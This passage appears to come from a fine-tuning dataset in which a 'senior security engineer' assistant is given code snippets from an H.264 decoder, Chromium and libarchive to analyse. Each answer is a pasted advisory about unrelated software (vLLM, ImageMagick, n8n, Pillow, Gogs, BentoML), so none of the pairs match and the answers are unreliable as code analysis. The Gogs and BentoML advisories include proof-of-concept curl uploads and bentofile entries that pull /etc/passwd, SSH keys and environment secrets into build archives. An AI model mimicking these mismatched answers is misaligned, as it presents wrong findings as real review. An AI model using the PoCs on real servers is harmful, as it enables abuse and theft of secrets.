= 0;\n\n        buflen = ih264d_find_start_code(pu1_buf, 0, u4_max_ofst,\n &u4_length_of_start_code,\n &u4_next_is_aud);\n\n if(buflen == -1)\n            buflen = 0;\n /* Ignore bytes beyond the allocated size of intermediate buffer */\n /* Since 8 bytes are read ahead, ensure 8 bytes are free at the\n        end of the buffer, which will be memset to 0 after emulation prevention */\n        buflen = MIN(buflen, buf_size - 8);\n\n        bytes_consumed = buflen + u4_length_of_start_code;\n        ps_dec_op->u4_num_bytes_consumed += bytes_consumed;\n\n {\n            UWORD8 u1_firstbyte, u1_nal_ref_idc;\n\n if(ps_dec->i4_app_skip_mode == IVD_SKIP_B)\n {\n                u1_firstbyte = *(pu1_buf + u4_length_of_start_code);\n                u1_nal_ref_idc = (UWORD8)(NAL_REF_IDC(u1_firstbyte));\n if(u1_nal_ref_idc == 0)\n {\n /*skip non reference frames*/\n                    cur_slice_is_nonref = 1;\n continue;\n }\n else\n {\n if(1 == cur_slice_is_nonref)\n {\n /*We have encountered a referenced frame,return to app*/\n                        ps_dec_op->u4_num_bytes_consumed -=\n                                        bytes_consumed;\n                        ps_dec_op->e_pic_type = IV_B_FRAME;\n                        ps_dec_op->u4_error_code =\n                                        IVD_DEC_FRM_SKIPPED;\n                        ps_dec_op->u4_error_code |= (1\n << IVD_UNSUPPORTEDPARAM);\n                        ps_dec_op->u4_frame_decoded_flag = 0;\n                        ps_dec_op->u4_size =\n sizeof(ivd_video_decode_op_t);\n /*signal the decode thread*/\n                        ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n                            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n\n return (IV_FAIL);\n }\n }\n\n }\n\n }\n\n\n if(buflen)\n {\n            memcpy(pu1_bitstrm_buf, pu1_buf + u4_length_of_start_code,\n                   buflen);\n /* Decoder may read extra 8 bytes near end of the frame */\n if((buflen + 8) < buf_size)\n {\n                memset(pu1_bitstrm_buf + buflen, 0, 8);\n }\n            u4_first_start_code_found = 1;\n\n }\n else\n {\n /*start code not found*/\n\n if(u4_first_start_code_found == 0)\n {\n /*no start codes found in current process call*/\n\n                ps_dec->i4_error_code = ERROR_START_CODE_NOT_FOUND;\n                ps_dec_op->u4_error_code |= 1 << IVD_INSUFFICIENTDATA;\n\n if(ps_dec->u4_pic_buf_got == 0)\n {\n\n                    ih264d_fill_output_struct_from_context(ps_dec,\n                                                           ps_dec_op);\n\n                    ps_dec_op->u4_error_code = ps_dec->i4_error_code;\n                    ps_dec_op->u4_frame_decoded_flag = 0;\n\n return (IV_FAIL);\n }\n else\n {\n                    ps_dec->u1_pic_decode_done = 1;\n continue;\n }\n }\n else\n {\n /* a start code has already been found earlier in the same process call*/\n                frame_data_left = 0;\n                header_data_left = 0;\n continue;\n }\n\n }\n\n        ps_dec->u4_return_to_app = 0;\n        ret = ih264d_parse_nal_unit(dec_hdl, ps_dec_op,\n                              pu1_bitstrm_buf, buflen);\n if(ret != OK)\n {\n            UWORD32 error =  ih264d_map_error(ret);\n            ps_dec_op->u4_error_code = error | ret;\n            api_ret_value = IV_FAIL;\n\n if((ret == IVD_RES_CHANGED)\n || (ret == IVD_MEM_ALLOC_FAILED)\n || (ret == ERROR_UNAVAIL_PICBUF_T)\n || (ret == ERROR_UNAVAIL_MVBUF_T)\n || (ret == ERROR_INV_SPS_PPS_T)\n || (ret == IVD_DISP_FRM_ZERO_OP_BUF_SIZE))\n {\n                ps_dec->u4_slice_start_code_found = 0;\n break;\n }\n\n if((ret == ERROR_INCOMPLETE_FRAME) || (ret == ERROR_DANGLING_FIELD_IN_PIC))\n {\n                ps_dec_op->u4_num_bytes_consumed -= bytes_consumed;\n                api_ret_value = IV_FAIL;\n break;\n }\n\n if(ret == ERROR_IN_LAST_SLICE_OF_PIC)\n {\n                api_ret_value = IV_FAIL;\n break;\n }\n\n }\n\n if(ps_dec->u4_return_to_app)\n {\n /*We have encountered a referenced frame,return to app*/\n            ps_dec_op->u4_num_bytes_consumed -= bytes_consumed;\n            ps_dec_op->u4_error_code = IVD_DEC_FRM_SKIPPED;\n            ps_dec_op->u4_error_code |= (1 << IVD_UNSUPPORTEDPARAM);\n            ps_dec_op->u4_frame_decoded_flag = 0;\n            ps_dec_op->u4_size = sizeof(ivd_video_decode_op_t);\n /*signal the decode thread*/\n            ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n                ih264d_signal_bs_deblk_thread(ps_dec);\n }\n return (IV_FAIL);\n\n }\n\n\n\n        header_data_left = ((ps_dec->i4_decode_header == 1)\n && (ps_dec->i4_header_decoded != 3)\n && (ps_dec_op->u4_num_bytes_consumed\n < ps_dec_ip->u4_num_Bytes));\n        frame_data_left = (((ps_dec->i4_decode_header == 0)\n && ((ps_dec->u1_pic_decode_done == 0)\n || (u4_next_is_aud == 1)))\n && (ps_dec_op->u4_num_bytes_consumed\n < ps_dec_ip->u4_num_Bytes));\n }\n while(( header_data_left == 1)||(frame_data_left == 1));\n\n if((ps_dec->u4_pic_buf_got == 1)\n && (ret != IVD_MEM_ALLOC_FAILED)\n && ps_dec->u2_total_mbs_coded < ps_dec->u2_frm_ht_in_mbs * ps_dec->u2_frm_wd_in_mbs)\n {\n        WORD32 num_mb_skipped;\n        WORD32 prev_slice_err;\n pocstruct_t temp_poc;\n        WORD32 ret1;\n        WORD32 ht_in_mbs;\n        ht_in_mbs = ps_dec->u2_pic_ht >> (4 + ps_dec->ps_cur_slice->u1_field_pic_flag);\n        num_mb_skipped = (ht_in_mbs * ps_dec->u2_frm_wd_in_mbs)\n - ps_dec->u2_total_mbs_coded;\n\n if(ps_dec->u4_first_slice_in_pic && (ps_dec->u4_pic_buf_got == 0))\n            prev_slice_err = 1;\n else\n            prev_slice_err = 2;\n\n if(ps_dec->u4_first_slice_in_pic && (ps_dec->u2_total_mbs_coded == 0))\n            prev_slice_err = 1;\n\n        ret1 = ih264d_mark_err_slice_skip(ps_dec, num_mb_skipped, ps_dec->u1_nal_unit_type == IDR_SLICE_NAL, ps_dec->ps_cur_slice->u2_frame_num,\n &temp_poc, prev_slice_err);\n\n if((ret1 == ERROR_UNAVAIL_PICBUF_T) || (ret1 == ERROR_UNAVAIL_MVBUF_T) ||\n (ret1 == ERROR_INV_SPS_PPS_T))\n {\n            ret = ret1;\n }\n }\n\n if((ret == IVD_RES_CHANGED)\n || (ret == IVD_MEM_ALLOC_FAILED)\n || (ret == ERROR_UNAVAIL_PICBUF_T)\n || (ret == ERROR_UNAVAIL_MVBUF_T)\n || (ret == ERROR_INV_SPS_PPS_T))\n {\n\n /* signal the decode thread */\n        ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet */\n if(ps_dec->u4_num_cores == 3)\n {\n            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n /* dont consume bitstream for change in resolution case */\n if(ret == IVD_RES_CHANGED)\n {\n            ps_dec_op->u4_num_bytes_consumed -= bytes_consumed;\n }\n return IV_FAIL;\n }\n\n\n if(ps_dec->u1_separate_parse)\n {\n /* If Format conversion is not complete,\n         complete it here */\n if(ps_dec->u4_num_cores == 2)\n {\n\n /*do deblocking of all mbs*/\n if((ps_dec->u4_nmb_deblk == 0) &&(ps_dec->u4_start_recon_deblk == 1) && (ps_dec->ps_cur_sps->u1_mb_aff_flag == 0))\n {\n                UWORD32 u4_num_mbs,u4_max_addr;\n tfr_ctxt_t s_tfr_ctxt;\n tfr_ctxt_t *ps_tfr_cxt = &s_tfr_ctxt;\n pad_mgr_t *ps_pad_mgr = &ps_dec->s_pad_mgr;\n\n /*BS is done for all mbs while parsing*/\n                u4_max_addr = (ps_dec->u2_frm_wd_in_mbs * ps_dec->u2_frm_ht_in_mbs) - 1;\n                ps_dec->u4_cur_bs_mb_num = u4_max_addr + 1;\n\n\n                ih264d_init_deblk_tfr_ctxt(ps_dec, ps_pad_mgr, ps_tfr_cxt,\n                                           ps_dec->u2_frm_wd_in_mbs, 0);\n\n\n                u4_num_mbs = u4_max_addr\n - ps_dec->u4_cur_deblk_mb_num + 1;\n\n                DEBUG_PERF_PRINTF(\"mbs left for deblocking= %d \\n\",u4_num_mbs);\n\n if(u4_num_mbs != 0)\n                    ih264d_check_mb_map_deblk(ps_dec, u4_num_mbs,\n                                                   ps_tfr_cxt,1);\n\n                ps_dec->u4_start_recon_deblk  = 0;\n\n }\n\n }\n\n /*signal the decode thread*/\n        ih264d_signal_decode_thread(ps_dec);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n }\n\n\n    DATA_SYNC();\n\n\n if((ps_dec_op->u4_error_code & 0xff)\n != ERROR_DYNAMIC_RESOLUTION_NOT_SUPPORTED)\n {\n        ps_dec_op->u4_pic_wd = (UWORD32)ps_dec->u2_disp_width;\n        ps_dec_op->u4_pic_ht = (UWORD32)ps_dec->u2_disp_height;\n }\n\n if(ps_dec->i4_header_decoded != 3)\n {\n        ps_dec_op->u4_error_code |= (1 << IVD_INSUFFICIENTDATA);\n\n }\n\n if(ps_dec->i4_decode_header == 1 && ps_dec->i4_header_decoded != 3)\n {\n        ps_dec_op->u4_error_code |= (1 << IVD_INSUFFICIENTDATA);\n\n }\n if(ps_dec->u4_prev_nal_skipped)\n {\n /*We have encountered a referenced frame,return to app*/\n        ps_dec_op->u4_error_code = IVD_DEC_FRM_SKIPPED;\n        ps_dec_op->u4_error_code |= (1 << IVD_UNSUPPORTEDPARAM);\n        ps_dec_op->u4_frame_decoded_flag = 0;\n        ps_dec_op->u4_size = sizeof(ivd_video_decode_op_t);\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n            ih264d_signal_bs_deblk_thread(ps_dec);\n }\n return (IV_FAIL);\n\n }\n\n if((ps_dec->u4_pic_buf_got == 1)\n && (ERROR_DANGLING_FIELD_IN_PIC != i4_err_status))\n {\n /*\n         * For field pictures, set the bottom and top picture decoded u4_flag correctly.\n         */\n\n if(ps_dec->ps_cur_slice->u1_field_pic_flag)\n {\n if(1 == ps_dec->ps_cur_slice->u1_bottom_field_flag)\n {\n                ps_dec->u1_top_bottom_decoded |= BOT_FIELD_ONLY;\n }\n else\n {\n                ps_dec->u1_top_bottom_decoded |= TOP_FIELD_ONLY;\n }\n }\n else\n {\n                ps_dec->u1_top_bottom_decoded = TOP_FIELD_ONLY | BOT_FIELD_ONLY;\n }\n\n /* if new frame in not found (if we are still getting slices from previous frame)\n         * ih264d_deblock_display is not called. Such frames will not be added to reference /display\n         */\n if ((ps_dec->ps_dec_err_status->u1_err_flag & REJECT_CUR_PIC) == 0)\n {\n /* Calling Function to deblock Picture and Display */\n            ret = ih264d_deblock_display(ps_dec);\n }\n\n\n /*set to complete ,as we dont support partial frame decode*/\n if(ps_dec->i4_header_decoded == 3)\n {\n            ps_dec->u2_total_mbs_coded = ps_dec->ps_cur_sps->u2_max_mb_addr + 1;\n }\n\n /*Update the i4_frametype at the end of picture*/\n if(ps_dec->ps_cur_slice->u1_nal_unit_type == IDR_SLICE_NAL)\n {\n            ps_dec->i4_frametype = IV_IDR_FRAME;\n }\n else if(ps_dec->i4_pic_type == B_SLICE)\n {\n            ps_dec->i4_frametype = IV_B_FRAME;\n }\n else if(ps_dec->i4_pic_type == P_SLICE)\n {\n            ps_dec->i4_frametype = IV_P_FRAME;\n }\n else if(ps_dec->i4_pic_type == I_SLICE)\n {\n            ps_dec->i4_frametype = IV_I_FRAME;\n }\n else\n {\n            H264_DEC_DEBUG_PRINT(\"Shouldn't come here\\n\");\n }\n\n        ps_dec->i4_content_type = ps_dec->ps_cur_slice->u1_field_pic_flag;\n\n        ps_dec->u4_total_frames_decoded = ps_dec->u4_total_frames_decoded + 2;\n        ps_dec->u4_total_frames_decoded = ps_dec->u4_total_frames_decoded\n - ps_dec->ps_cur_slice->u1_field_pic_flag;\n\n }\n\n /* close deblock thread if it is not closed yet*/\n if(ps_dec->u4_num_cores == 3)\n {\n        ih264d_signal_bs_deblk_thread(ps_dec);\n }\n\n\n {\n /* In case the decoder is configured to run in low delay mode,\n         * then get display buffer and then format convert.\n         * Note in this mode, format conversion does not run paralelly in a thread and adds to the codec cycles\n         */\n\n if((IVD_DECODE_FRAME_OUT == ps_dec->e_frm_out_mode)\n && ps_dec->u1_init_dec_flag)\n {\n\n            ih264d_get_next_display_field(ps_dec, ps_dec->ps_out_buffer,\n &(ps_dec->s_disp_op));\n if(0 == ps_dec->s_disp_op.u4_error_code)\n {\n                ps_dec->u4_fmt_conv_cur_row = 0;\n                ps_dec->u4_output_present = 1;\n }\n }\n\n        ih264d_fill_output_struct_from_context(ps_dec, ps_dec_op);\n\n /* If Format conversion is not complete,\n         complete it here */\n if(ps_dec->u4_output_present &&\n (ps_dec->u4_fmt_conv_cur_row < ps_dec->s_disp_frame_info.u4_y_ht))\n {\n            ps_dec->u4_fmt_conv_num_rows = ps_dec->s_disp_frame_info.u4_y_ht\n - ps_dec->u4_fmt_conv_cur_row;\n            ih264d_format_convert(ps_dec, &(ps_dec->s_disp_op),\n                                  ps_dec->u4_fmt_conv_cur_row,\n                                  ps_dec->u4_fmt_conv_num_rows);\n            ps_dec->u4_fmt_conv_cur_row += ps_dec->u4_fmt_conv_num_rows;\n }\n\n        ih264d_release_display_field(ps_dec, &(ps_dec->s_disp_op));\n }\n\n if(ps_dec->i4_decode_header == 1 && (ps_dec->i4_header_decoded & 1) == 1)\n {\n        ps_dec_op->u4_progressive_frame_flag = 1;\n if((NULL != ps_dec->ps_cur_sps) && (1 == (ps_dec->ps_cur_sps->u1_is_valid)))\n {\n if((0 == ps_dec->ps_sps->u1_frame_mbs_only_flag)\n && (0 == ps_dec->ps_sps->u1_mb_aff_flag))\n                ps_dec_op->u4_progressive_frame_flag = 0;\n\n }\n }\n\n if((TOP_FIELD_ONLY | BOT_FIELD_ONLY) == ps_dec->u1_top_bottom_decoded)\n {\n        ps_dec->u1_top_bottom_decoded = 0;\n }\n /*--------------------------------------------------------------------*/\n /* Do End of Pic processing.                                          */\n /* Should be called only if frame was decoded in previous process call*/\n /*--------------------------------------------------------------------*/\n if(ps_dec->u4_pic_buf_got == 1)\n {\n if(1 == ps_dec->u1_last_pic_not_decoded)\n {\n            ret = ih264d_end_of_pic_dispbuf_mgr(ps_dec);\n\n if(ret != OK)\n return ret;\n\n            ret = ih264d_end_of_pic(ps_dec);\n if(ret != OK)\n return ret;\n }\n else\n {\n            ret = ih264d_end_of_pic(ps_dec);\n if(ret != OK)\n return ret;\n }\n\n }\n\n\n /*Data memory barrier instruction,so that yuv write by the library is complete*/\n    DATA_SYNC();\n\n    H264_DEC_DEBUG_PRINT(\"The num bytes consumed: %d\\n\",\n                         ps_dec_op->u4_num_bytes_consumed);\n return api_ret_value;\n}\n\n```"}, {"role": "assistant", "content": "vLLM vulnerable to DoS via large Chat Completion or Tokenization requests with specially crafted `chat_template_kwargs`\n\n### Summary\nThe /v1/chat/completions and /tokenize endpoints allow a `chat_template_kwargs` request parameter that is used in the code before it is properly validated against the chat template. With the right `chat_template_kwargs` parameters, it is possible to block processing of the API server for long periods of time, delaying all other requests \n\n### Details\nIn serving_engine.py, the chat_template_kwargs are unpacked into kwargs passed to chat_utils.py `apply_hf_chat_template` with no validation on the keys or values in that chat_template_kwargs dict. This means they can be used to override optional parameters in the `apply_hf_chat_template` method, such as `tokenize`, changing its default from False to True.\n\nhttps://github.com/vllm-project/vllm/blob/2a6dc67eb520ddb9c4138d8b35ed6fe6226997fb/vllm/entrypoints/openai/serving_engine.py#L809-L814\n\nhttps://github.com/vllm-project/vllm/blob/2a6dc67eb520ddb9c4138d8b35ed6fe6226997fb/vllm/entrypoints/chat_utils.py#L1602-L1610\n\nBoth serving_chat.py and serving_tokenization.py call into this `_preprocess_chat` method of `serving_engine.py` and they both pass in `chat_template_kwargs`.\n\nSo, a `chat_template_kwargs` like `{\"tokenize\": True}` makes tokenization happen as part of applying the chat template, even though that is not expected. Tokenization is a blocking operation, and with sufficiently large input can block the API server's event loop, which blocks handling of all other requests until this tokenization is complete.\n\nThis optional `tokenize` parameter to `apply_hf_chat_template` does not appear to be used, so one option would be to just hard-code that to always be False instead of allowing it to be optionally overridden by callers. A better option may be to not pass `chat_template_kwargs` as unpacked kwargs but instead as a dict, and only unpack them after the logic in `apply_hf_chat_template` that resolves the kwargs against the chat template.\n\n### Impact\n\nAny authenticated user can cause a denial of service to a vLLM server with Chat Completion or Tokenize requests.\n\n### Fix\n\nhttps://github.com/vllm-project/vllm/pull/27205"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nHRESULT CGaiaCredentialBase::SaveAccountInfo(\n    const base::DictionaryValue& properties) {\n  LOGFN(INFO);\n\n  base::string16 sid = GetDictString(&properties, kKeySID);\n  if (sid.empty()) {\n    LOGFN(ERROR) << \"SID is empty\";\n    return E_INVALIDARG;\n  }\n\n  base::string16 username = GetDictString(&properties, kKeyUsername);\n  if (username.empty()) {\n    LOGFN(ERROR) << \"Username is empty\";\n    return E_INVALIDARG;\n  }\n\n  base::string16 password = GetDictString(&properties, kKeyPassword);\n  if (password.empty()) {\n    LOGFN(ERROR) << \"Password is empty\";\n    return E_INVALIDARG;\n  }\n\n  base::string16 domain = GetDictString(&properties, kKeyDomain);\n\n  auto profile = ScopedUserProfile::Create(sid, domain, username, password);\n  if (!profile) {\n    LOGFN(ERROR) << \"Could not load user profile\";\n    return E_UNEXPECTED;\n  }\n\n  HRESULT hr = profile->SaveAccountInfo(properties);\n  if (FAILED(hr))\n    LOGFN(ERROR) << \"profile.SaveAccountInfo failed (cont) hr=\" << putHR(hr);\n\n  return hr;\n}\n\n```"}, {"role": "assistant", "content": "ImageMagick's Security Policy Bypass through config/policy-secure.xml via \"fd handler\" leads to stdin/stdout access\n\nThe shipped “secure” security policy includes a rule intended to prevent reading/writing from standard streams:\n\n```xml\n<policy domain=\"path\" rights=\"none\" pattern=\"-\"/>\n```\n\nHowever, ImageMagick also supports fd:<n> pseudo-filenames (e.g., fd:0, fd:1). This path form is not blocked by the secure policy templates, and therefore bypasses the protection goal of “no stdin/stdout”.\n\nTo resolve this, users can add the following change to their security policy.\n\n```xml\n<policy domain=\"path\" rights=\"none\" pattern=\"fd:*\"/>\n```\n\nAnd this will also be included in ImageMagick's more secure policies by default."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid OmniboxViewViews::ExecuteCommand(int command_id, int event_flags) {\n  DestroyTouchSelection();\n  switch (command_id) {\n    case IDS_PASTE_AND_GO:\n      model()->PasteAndGo(GetClipboardText());\n      return;\n    case IDC_EDIT_SEARCH_ENGINES:\n      location_bar_view_->command_updater()->ExecuteCommand(command_id);\n      return;\n\n    case IDS_APP_PASTE:\n      ExecuteTextEditCommand(ui::TextEditCommand::PASTE);\n      return;\n    default:\n      if (Textfield::IsCommandIdEnabled(command_id)) {\n        Textfield::ExecuteCommand(command_id, event_flags);\n        return;\n      }\n      OnBeforePossibleChange();\n      location_bar_view_->command_updater()->ExecuteCommand(command_id);\n      OnAfterPossibleChange(true);\n      return;\n  }\n}\n\n```"}, {"role": "assistant", "content": "n8n's Improper CSP Enforcement in Webhook Responses May Allow Stored XSS\n\n## Impact\n\nA Cross-site Scripting (XSS) vulnerability has been identified in the handling of webhook responses and related HTTP endpoints. Under certain conditions, the Content Security Policy (CSP) sandbox protection intended to isolate HTML responses may not be applied correctly.\n\nAn authenticated user with permission to create or modify workflows could abuse this to execute malicious scripts with same-origin privileges when other users interact with the crafted workflow. This could lead to session hijacking and account takeover.\n\n## Patches\n\nThe issue has been fixed in n8n versions 1.122.5 and 1.123.2. Users should upgrade to these versions or later to remediate the vulnerability.\n\n## Workarounds\n\nIf upgrading is not immediately possible, administrators should consider the following temporary mitigations:\n\n- Limit workflow creation and editing permissions to fully trusted users only.\n- Never execute untrusted workflows.\n- Review workflows that receive data from via webhooks, forms, or MCP servers to ensure they are communicating with trusted entities before executing them manually.\n\nThese workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.\n\n---\nn8n has adopted CVSS 4.0 as primary score for all security advisories. CVSS 3.1 vector strings are provided for backward compatibility.\n\nCVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nsize_t SharedMemoryHandleProvider::Handle::mapped_size() const {\n  return owner_->mapped_size_;\n}\n\n```"}, {"role": "assistant", "content": "Pillow affected by out-of-bounds write when loading PSD images\n\n### Impact\nAn out-of-bounds write may be triggered when loading a specially crafted PSD image. Pillow >= 10.3.0 users are affected.\n\n### Patches\nPillow 12.1.1 will be released shortly with a fix for this.\n\n### Workarounds\n`Image.open()` has a `formats` parameter that can be used to prevent PSD images from being opened.\n\n### References\nPillow 12.1.1 will add release notes at https://pillow.readthedocs.io/en/stable/releasenotes/index.html"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nsk_sp<SkTypeface> CreateSkTypeface(bool italic,\n                                   gfx::Font::Weight weight,\n                                   std::string* family,\n                                   bool* out_success) {\n  DCHECK(family);\n  TRACE_EVENT0(\"fonts\", \"gfx::CreateSkTypeface\");\n\n  const int font_weight = (weight == Font::Weight::INVALID)\n                              ? static_cast<int>(Font::Weight::NORMAL)\n                              : static_cast<int>(weight);\n  SkFontStyle sk_style(\n      font_weight, SkFontStyle::kNormal_Width,\n      italic ? SkFontStyle::kItalic_Slant : SkFontStyle::kUpright_Slant);\n  sk_sp<SkTypeface> typeface;\n  {\n    TRACE_EVENT1(TRACE_DISABLED_BY_DEFAULT(\"fonts\"), \"SkTypeface::MakeFromName\",\n                 \"family\", *family);\n    typeface = SkTypeface::MakeFromName(family->c_str(), sk_style);\n  }\n  if (!typeface) {\n    TRACE_EVENT1(TRACE_DISABLED_BY_DEFAULT(\"fonts\"), \"SkTypeface::MakeFromName\",\n                 \"family\", kFallbackFontFamilyName);\n    typeface = sk_sp<SkTypeface>(\n        SkTypeface::MakeFromName(kFallbackFontFamilyName, sk_style));\n    if (!typeface) {\n      *out_success = false;\n      return nullptr;\n    }\n    *family = kFallbackFontFamilyName;\n  }\n  *out_success = true;\n  return typeface;\n}\n\n```"}, {"role": "assistant", "content": "Unauthenticated File Upload in Gogs\n\nSecurity Advisory:Unauthenticated File Upload in Gogs\nVulnerability Type: Unauthenticated File Upload\nDate: Aug 5, 2025\nDiscoverer: OpenAI Security Research\n\n## Summary\nGogs exposes unauthenticated file upload endpoints by default. When the global RequireSigninView setting is disabled (default), any remote user can upload arbitrary files to the server via /releases/attachments and /issues/attachments. This enables the instance to be abused as a public file host, potentially leading to disk exhaustion, content hosting, or delivery of malware. CSRF tokens do not mitigate this attack due to same-origin cookie issuance.\n\n## Affected Versions\n\n- Software: [Gogs](https://github.com/gogs/gogs/tree/main)\n- Confirmed Version(s): 28f83626d4ed0aa7b89493be2ea8b79ca038331e\n- Likely Affected: All versions since 2020-04-05 with unauthenticated attachments endpoints\n- Introduced Commit: 07818d5fa\n\n## Vulnerability Details\nThe web.go router exposes the following endpoints under the ignSignIn route group:\n\n### Vulnerable Code Snippet\n```\nm.Post(\"/issues/attachments\", repo.UploadIssueAttachment)\nm.Post(\"/releases/attachments\", repo.UploadReleaseAttachment)\n```\nThese endpoints are accessible by unauthenticated users if the configuration variable RequireSigninView is false (default). This allows arbitrary file uploads to data/attachments, returning a UUID in response.\n\nWhile CSRF protection is enabled, attackers can obtain a valid token anonymously from the site and use it in the upload request without authentication.\n## Description\nAnonymous file upload using only default configuration and a CSRF token obtained from the homepage.\n## POC\n```\n# Run Gogs docker \ndocker start gogs\n\n# Software will be run on http://localhost:10880/. Finish the setup with local Sqlite database\n\n# Get CSRF cookie into a jar\ncurl -sS -c cookies.txt http://localhost:10880/ -o /dev/null\n\n# Extract the _csrf value from the jar\nCSRF=\"$(awk '$6==\"_csrf\"{print $7}' cookies.txt | tail -n1)\"\n\n# Upload the file, sending cookie jar + header\ncurl -sS \\\n  -b cookies.txt -c cookies.txt \\\n  -H \"X-CSRF-Token: $CSRF\" \\\n  -H \"Referer: http://localhost:10880/\" \\\n  -F \"file=@image.png\" \\\n  http://localhost:10880/issues/attachments\n\n => {\"uuid\":\"<UUID>\"}\n```\nThe attachment will be available at: http://localhost:10880/attachments/<uuid>\n\n## Impact\n**Unrestricted File Upload:** Attackers can store arbitrary content on the server.\n**Denial-of-Service:** Repeated uploads can exhaust disk space.\n**Malware Hosting:** Gogs may inadvertently serve attacker-hosted payloads under its domain.\n\n## Realistic Exploitation Scenarios\n\n- Spammers or malicious actors use the Gogs instance to host phishing payloads or malware.\n- Attackers fill up disk with repeated uploads.\n- Attackers use hosted Gogs instances as public file dumps (e.g., for P2P, exfiltration)\n\n## Potential Impact\nThis unauthenticated upload vector effectively turns any Gogs instance into a file hosting platform open to the public. This is especially dangerous for production or Internet-exposed installations. The combination of no login requirement, wildcard MIME support, and unrestricted access to attachments enables both resource abuse and potential malware distribution.\n\n## Timeline\n\n- August 2025: Discovered via GPT5\n- August 2025: Reproduced and confirmed via PoC and sanitizer\n- Aug 6, 2025 - Sent to Gogs via https://github.com/gogs/gogs/security/advisories/new"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nset_mac_metadata(struct archive_write_disk *a, const char *pathname,\n\t\t const void *metadata, size_t metadata_size)\n{\n\t(void)a; /* UNUSED */\n\t(void)pathname; /* UNUSED */\n\t(void)metadata; /* UNUSED */\n\t(void)metadata_size; /* UNUSED */\n\treturn (ARCHIVE_OK);\n}\n\n```"}, {"role": "assistant", "content": "BentoML has a Path Traversal via Bentofile Configuration\n\n### Summary\n\nBentoML's `bentofile.yaml` configuration allows path traversal attacks through multiple file path fields (`description`, `docker.setup_script`, `docker.dockerfile_template`, `conda.environment_yml`). An attacker can craft a malicious bentofile that, when built by a victim, exfiltrates arbitrary files from the filesystem into the bento archive. This enables supply chain attacks where sensitive files (SSH keys, credentials, environment variables) are silently embedded in bentos and exposed when pushed to registries or deployed.\n\n### Details\n\nThe vulnerability exists in how BentoML resolves user-provided file paths without validating that they remain within the build context directory.\n\n**Vulnerable function** in `src/bentoml/_internal/utils/filesystem.py:114-131`:\n\n```python\ndef resolve_user_filepath(filepath: str, ctx: t.Optional[str]) -> str:\n    _path = os.path.expanduser(os.path.expandvars(filepath))\n    if not os.path.isabs(_path) and ctx:\n        _path = os.path.expanduser(os.path.join(ctx, filepath))\n    if os.path.exists(_path):\n        return os.path.realpath(_path)  # No path containment check\n    raise FileNotFoundError(f\"file {filepath} not found\")\n```\n\n**Vulnerable code** in `src/bentoml/_internal/bento/bento.py:348-355`:\n\n```python\nif build_config.description.startswith(\"file:\"):\n    file_name = build_config.description[5:].strip()\n    if not ctx_path.joinpath(file_name).exists():\n        raise InvalidArgument(f\"File {file_name} does not exist.\")\n    shutil.copy(ctx_path.joinpath(file_name), bento_readme)  # Path traversal\n```\n\nAll four vulnerable fields:\n- `description: \"file:../../../etc/passwd\"` → copied to `README.md`\n- `docker.setup_script: \"../../../etc/passwd\"` → copied to `env/docker/setup_script`\n- `docker.dockerfile_template: \"../../../secret\"` → copied to `env/docker/Dockerfile.template`\n- `conda.environment_yml: \"../../../etc/hosts\"` → copied to `env/conda/environment.yml`\n\n**Multiple path formats are supported, making exploitation trivial:**\n\n| Format | `description` | `setup_script` | `dockerfile_template` | `environment_yml` |\n|--------|---------------|----------------|----------------------|-------------------|\n| Absolute paths (`/etc/passwd`) | Yes | Yes | Yes | Yes |\n| Tilde expansion (`~/.ssh/id_rsa`) | No | Yes | Yes | Yes |\n| Env vars (`$HOME/.aws/credentials`) | No | Yes | Yes | Yes |\n| Relative traversal (`../../../etc/passwd`) | Yes | Yes | Yes | Yes |\n| Proc filesystem (`/proc/self/environ`) | Yes | Yes | Yes | Yes |\n\nThe `description` field uses `pathlib.Path.joinpath()` directly, while other fields use `resolve_user_filepath()` which calls `os.path.expanduser()` and `os.path.expandvars()`.\n\nThe `/proc/self/environ` vector is particularly dangerous in CI/CD pipelines where secrets are commonly passed as environment variables (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `DATABASE_PASSWORD`, etc.).\n\n### PoC\n\n1. Create a minimal service:\n\n```python\n# service.py\nimport bentoml\n\n@bentoml.service\nclass TestService:\n    @bentoml.api\n    def predict(self, text: str) -> str:\n        return text\n```\n\n2. Create malicious `bentofile.yaml`. Multiple attack vectors are available:\n\n**Vector 1: Exfiltrate /etc/passwd via description field**\n```yaml\nservice: \"service.py:TestService\"\ndescription: \"file:/etc/passwd\"\n```\n\n**Vector 2: Exfiltrate all environment variables (CI/CD secrets)**\n```yaml\nservice: \"service.py:TestService\"\ndescription: \"file:/proc/self/environ\"\n```\n\n**Vector 3: Exfiltrate files using environment variable expansion (docker fields only)**\n```yaml\nservice: \"service.py:TestService\"\ndocker:\n  dockerfile_template: \"$HOME/.aws/credentials\"\n```\n\n**Vector 4: Exfiltrate files using tilde expansion (docker fields 